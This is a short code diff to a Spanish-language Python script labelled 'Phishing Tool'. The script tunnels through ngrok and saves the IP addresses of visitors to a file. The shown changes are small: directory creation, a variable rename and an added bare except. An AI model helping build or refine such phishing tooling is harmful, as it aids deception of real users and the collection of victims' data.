@@ -33,6 +33,11 @@ def clear():
 
 def menu():
     clear()
+    fix = ruta.replace('%', '')
+    if (path.isfile(fix) != True):
+        os.mkdir(fix)
+    else:
+        pass
     print(f'''
     {c}Phishing Tool 
 
@@ -251,8 +256,10 @@ def empezar_ngrok():
                     with open(f'./{jajaj}. Ips.txt', 'w') as ips:
                         ips.writelines(holas)
                 else:
-                    with open('./Ips.txt', 'w')as ip:
-                        ip.writelines(holas)
+                    with open('./Ips.txt', 'w')as ipa:
+                        ipa.writelines(holas)
+            except:
+                pass
         finally:
             print(f'{Fore.LIGHTRED_EX}Cerrando Ngrok...')
             ngrok.kill()
@@ -264,4 +271,3 @@ def empezar_ngrok():
 
 if __name__ == '__main__':
     menu()
-    
